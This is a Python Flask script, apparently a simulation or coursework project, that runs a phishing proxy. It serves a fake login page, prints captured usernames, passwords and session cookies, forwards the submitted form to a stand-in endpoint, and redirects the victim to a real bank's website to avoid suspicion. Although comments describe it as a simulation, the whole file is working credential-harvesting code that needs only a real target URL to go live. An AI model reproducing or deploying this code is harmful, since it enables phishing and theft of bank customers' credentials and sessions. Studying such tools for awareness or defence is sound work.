#!/usr/bin/env python3
"""
File: app.py
Author: Norman Huang
Date: 20 July, 2025
Description: This file runs the frontend and captures/forwards the credentials inputted by the user.
Sources used:
    - https://www.geeksforgeeks.org/python/python-flask-request-object/
    - https://stackoverflow.com/questions/6656363/proxying-to-another-web-service-with-flask
    - https://stackoverflow.com/questions/77309155/python-requests-session-response-headers-not-showing-set-cookie-headers
    - https://stackoverflow.com/questions/14343812/redirecting-to-url-in-flask
"""

from flask import Flask, request, render_template, redirect
import requests

app = Flask(__name__)
# Start session for cookie persistence across requests
session = requests.Session()

# Set dummy endpoint
# In a real attack, this would be the legitimate website
# A fake session ID and authentication token are used for simulation purposes
# Do not use the URL of a real bank, it is illegal
real_url = 'https://httpbin.org/cookies/set/session_cookie/IAmACookie123'

# Render the HTML file for web browser display
@app.route('/')
def login_page():
    return render_template('fake_login.html')

# Capture and forward credentials
@app.route('/login', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')

    # Log the stolen credentials
    print(f"- CAPTURED Username:")
    print(f"    {username}")
    print(f"- CAPTURED Password:")
    print(f"    {password}")

    # Preserve cookies
    session.get(real_url)

    # Retrieve and log cookie
    cookies = session.cookies
    print("- CAPTURED Cookies:")
    print(f"    {list(cookies)[0].name} = {list(cookies)[0].value}")

    # Forward the request to a dummy endpoint
    try:
        requests.post(real_url, data=request.form)
        print("- FORWARDED TO:", real_url)
    except Exception as e:
        print("- ERROR FORWARDING:", e)


    # Redirect victim to legitimate website to reduce suspicion
    return redirect("https://www.anz.com.au/personal/", code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
